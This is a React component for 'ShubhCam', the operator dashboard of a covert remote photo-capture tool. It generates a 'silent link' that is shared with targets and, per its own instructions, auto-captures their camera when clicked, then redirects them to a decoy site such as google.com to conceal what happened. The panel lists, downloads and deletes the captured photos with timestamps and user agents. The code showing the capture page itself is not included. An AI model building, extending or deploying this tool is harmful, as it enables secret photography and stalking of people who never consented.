import { useState, useEffect } from "react";
import { Camera, Link2, Image, Copy, Settings, RefreshCw, Zap, Trash2, Download, ExternalLink } from "lucide-react";
import { Button } from "./ui/button";
import { Input } from "./ui/input";
import { toast } from "@/hooks/use-toast";
import { cn } from "@/lib/utils";

interface CapturedPhoto {
  id: number;
  image: string;
  timestamp: string;
  userAgent: string;
}

const ShubhCam = () => {
  const [activeTab, setActiveTab] = useState<"link" | "photos">("link");
  const [redirectUrl, setRedirectUrl] = useState("https://google.com");
  const [photos, setPhotos] = useState<CapturedPhoto[]>([]);
  const [sessionId, setSessionId] = useState(() => Math.random().toString(36).substring(2, 10));

  // Get current domain for link generation
  const currentOrigin = typeof window !== 'undefined' ? window.location.origin : '';
  const captureLink = `${currentOrigin}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;

  // Load photos from localStorage
  const loadPhotos = () => {
    const storedPhotos = localStorage.getItem(`shubhcam_${sessionId}`);
    if (storedPhotos) {
      setPhotos(JSON.parse(storedPhotos));
    } else {
      setPhotos([]);
    }
  };

  useEffect(() => {
    loadPhotos();
  }, [sessionId]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied!",
      description: "Link copied to clipboard",
    });
  };

  const generateNewSession = () => {
    const newSessionId = Math.random().toString(36).substring(2, 10);
    setSessionId(newSessionId);
    setPhotos([]);
    toast({
      title: "New Session Created",
      description: `Session ID: ${newSessionId}`,
    });
  };

  const refreshPhotos = () => {
    loadPhotos();
    toast({
      title: "Refreshed",
      description: `Found ${photos.length} captured photos`,
    });
  };

  const deletePhoto = (photoId: number) => {
    const updatedPhotos = photos.filter(p => p.id !== photoId);
    setPhotos(updatedPhotos);
    localStorage.setItem(`shubhcam_${sessionId}`, JSON.stringify(updatedPhotos));
    toast({
      title: "Deleted",
      description: "Photo removed",
    });
  };

  const downloadPhoto = (photo: CapturedPhoto) => {
    const link = document.createElement('a');
    link.href = photo.image;
    link.download = `capture_${photo.id}.jpg`;
    link.click();
  };

  const clearAllPhotos = () => {
    setPhotos([]);
    localStorage.removeItem(`shubhcam_${sessionId}`);
    toast({
      title: "Cleared",
      description: "All photos deleted",
    });
  };

  return (
    <div className="border-2 border-neon-green rounded-lg p-6 bg-card/30 backdrop-blur mt-6">
      {/* Header */}
      <div className="flex items-center gap-3 mb-4">
        <div className="p-2 rounded-lg border border-neon-cyan bg-neon-cyan/10">
          <Camera className="w-6 h-6 text-neon-cyan" />
        </div>
        <div>
          <h2 className="font-display font-bold text-xl">
            <span className="text-neon-green">SHUBH</span>
            <span className="text-neon-pink">CAM</span>
          </h2>
          <p className="text-muted-foreground text-xs flex items-center gap-1">
            <Zap className="w-3 h-3" /> REMOTE PHOTO CAPTURE
          </p>
        </div>
      </div>

      {/* Tabs */}
      <div className="flex rounded-lg overflow-hidden border border-neon-green/50 mb-6">
        <button
          onClick={() => setActiveTab("link")}
          className={cn(
            "flex-1 py-3 px-4 flex items-center justify-center gap-2 transition-all",
            activeTab === "link"
              ? "bg-neon-green text-background font-bold"
              : "bg-card text-muted-foreground hover:bg-muted"
          )}
        >
          <Zap className="w-4 h-4" /> LINK
        </button>
        <button
          onClick={() => { setActiveTab("photos"); refreshPhotos(); }}
          className={cn(
            "flex-1 py-3 px-4 flex items-center justify-center gap-2 transition-all",
            activeTab === "photos"
              ? "bg-neon-green text-background font-bold"
              : "bg-card text-muted-foreground hover:bg-muted"
          )}
        >
          <Image className="w-4 h-4" /> PHOTOS ({photos.length})
        </button>
      </div>

      {activeTab === "link" ? (
        <div className="space-y-6">
          {/* How it works */}
          <div className="bg-muted/50 rounded-lg p-4 border border-border">
            <h3 className="font-bold text-foreground mb-2">How it works:</h3>
            <ol className="text-sm text-muted-foreground space-y-1 list-decimal list-inside">
              <li>Copy the link below</li>
              <li>Share with anyone</li>
              <li>When they click, camera auto-captures & redirects!</li>
            </ol>
          </div>

          {/* Session ID */}
          <div className="flex items-center gap-2 text-xs">
            <span className="text-muted-foreground">Session:</span>
            <span className="text-neon-cyan font-mono">{sessionId}</span>
          </div>

          {/* Silent Link */}
          <div>
            <div className="flex items-center gap-2 mb-2">
              <span className="text-neon-cyan">👁</span>
              <h3 className="text-neon-green font-bold">SILENT LINK (Auto Capture)</h3>
            </div>
            <div className="flex gap-2">
              <Input
                value={captureLink}
                readOnly
                className="bg-input border-neon-green/50 text-neon-green text-xs font-mono"
              />
              <Button
                variant="outline"
                size="icon"
                onClick={() => copyToClipboard(captureLink)}
                className="border-neon-green text-neon-green hover:bg-neon-green/10 shrink-0"
              >
                <Copy className="w-4 h-4" />
              </Button>
            </div>
            <p className="text-neon-orange text-xs mt-2">
              ⚠ Capture ke baad redirect: {redirectUrl}
            </p>
          </div>

          {/* Redirect URL */}
          <div>
            <div className="flex items-center gap-2 mb-2">
              <span className="text-neon-cyan">🔗</span>
              <h3 className="text-neon-cyan font-bold">REDIRECT URL</h3>
            </div>
            <Input
              value={redirectUrl}
              onChange={(e) => setRedirectUrl(e.target.value)}
              placeholder="https://google.com"
              className="bg-input border-neon-green/50 text-neon-green"
            />
            <p className="text-neon-purple text-xs mt-2">
              💡 User capture ke baad is URL pe redirect hoga
            </p>
          </div>

          {/* Test Link */}
          <Button
            onClick={() => window.open(captureLink, '_blank')}
            variant="outline"
            className="w-full border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10"
          >
            <ExternalLink className="w-4 h-4 mr-2" /> TEST LINK
          </Button>

          {/* Action Buttons */}
          <div className="space-y-3">
            <Button
              onClick={generateNewSession}
              variant="outline"
              className="w-full border-neon-green text-neon-green hover:bg-neon-green/10"
            >
              <Link2 className="w-4 h-4 mr-2" /> NEW SESSION
            </Button>
            <Button
              onClick={refreshPhotos}
              className="w-full bg-neon-pink text-background font-bold hover:bg-neon-pink/90"
            >
              <RefreshCw className="w-4 h-4 mr-2" /> REFRESH PHOTOS
            </Button>
          </div>
        </div>
      ) : (
        <div className="space-y-4">
          {photos.length === 0 ? (
            <div className="min-h-[200px] flex items-center justify-center">
              <div className="text-center text-muted-foreground">
                <Camera className="w-12 h-12 mx-auto mb-3 opacity-50" />
                <p>No photos captured yet</p>
                <p className="text-sm">Share your link to start capturing!</p>
              </div>
            </div>
          ) : (
            <>
              <div className="flex justify-between items-center">
                <span className="text-sm text-muted-foreground">{photos.length} captures</span>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={clearAllPhotos}
                  className="border-neon-red text-neon-red hover:bg-neon-red/10"
                >
                  <Trash2 className="w-3 h-3 mr-1" /> Clear All
                </Button>
              </div>
              <div className="grid grid-cols-2 gap-4">
                {photos.map((photo) => (
                  <div key={photo.id} className="relative group">
                    <img 
                      src={photo.image} 
                      alt={`Capture ${photo.id}`} 
                      className="rounded-lg border border-neon-green/30 w-full aspect-square object-cover"
                    />
                    <div className="absolute inset-0 bg-background/80 opacity-0 group-hover:opacity-100 transition-opacity rounded-lg flex items-center justify-center gap-2">
                      <Button
                        size="icon"
                        variant="outline"
                        onClick={() => downloadPhoto(photo)}
                        className="border-neon-green text-neon-green"
                      >
                        <Download className="w-4 h-4" />
                      </Button>
                      <Button
                        size="icon"
                        variant="outline"
                        onClick={() => deletePhoto(photo.id)}
                        className="border-neon-red text-neon-red"
                      >
                        <Trash2 className="w-4 h-4" />
                      </Button>
                    </div>
                    <p className="text-xs text-muted-foreground mt-1 truncate">
                      {new Date(photo.timestamp).toLocaleString()}
                    </p>
                  </div>
                ))}
              </div>
            </>
          )}
          
          <Button
            onClick={refreshPhotos}
            className="w-full bg-neon-pink text-background font-bold hover:bg-neon-pink/90"
          >
            <RefreshCw className="w-4 h-4 mr-2" /> REFRESH PHOTOS
          </Button>
        </div>
      )}
    </div>
  );
};

export default ShubhCam;
